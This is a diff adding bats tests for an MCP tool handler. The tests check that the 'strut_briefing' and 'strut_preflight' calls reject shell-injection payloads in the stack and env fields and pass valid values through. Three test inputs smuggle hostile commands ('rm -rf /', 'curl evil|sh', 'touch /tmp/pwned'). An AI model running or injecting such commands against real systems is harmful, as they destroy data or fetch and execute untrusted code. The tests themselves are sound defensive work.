@@ -159,3 +159,44 @@ teardown() {
   [[ "$output" == *"Unknown tool"* ]]
   [[ "$output" == *"isError"* ]]
 }
+
+# ── strut_briefing / strut_preflight: validation + pass-through ────────────────
+
+@test "_mcp_tools_call strut_briefing: rejects an injection payload in stack" {
+  run _mcp_tools_call strut_briefing '{"stack":"demo; touch /tmp/pwned #"}'
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"isError"* ]]
+  [[ "$output" != *"CALLED:"* ]]
+}
+
+@test "_mcp_tools_call strut_briefing: rejects an injection payload in env" {
+  run _mcp_tools_call strut_briefing '{"stack":"demo","env":"prod; rm -rf /"}'
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"isError"* ]]
+  [[ "$output" != *"CALLED:"* ]]
+}
+
+@test "_mcp_tools_call strut_briefing: a valid stack reaches strut_bin" {
+  run _mcp_tools_call strut_briefing '{"stack":"demo"}'
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"CALLED: demo briefing --env prod --json"* ]]
+}
+
+@test "_mcp_tools_call strut_preflight: rejects an injection payload in stack" {
+  run _mcp_tools_call strut_preflight '{"stack":"demo && curl evil|sh"}'
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"isError"* ]]
+  [[ "$output" != *"CALLED:"* ]]
+}
+
+@test "_mcp_tools_call strut_preflight: a valid stack reaches strut_bin" {
+  run _mcp_tools_call strut_preflight '{"stack":"demo"}'
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"CALLED: demo preflight --env prod --json"* ]]
+}
+
+@test "_mcp_tools_call strut_preflight: honors a custom env" {
+  run _mcp_tools_call strut_preflight '{"stack":"demo","env":"staging"}'
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"CALLED: demo preflight --env staging --json"* ]]
+}
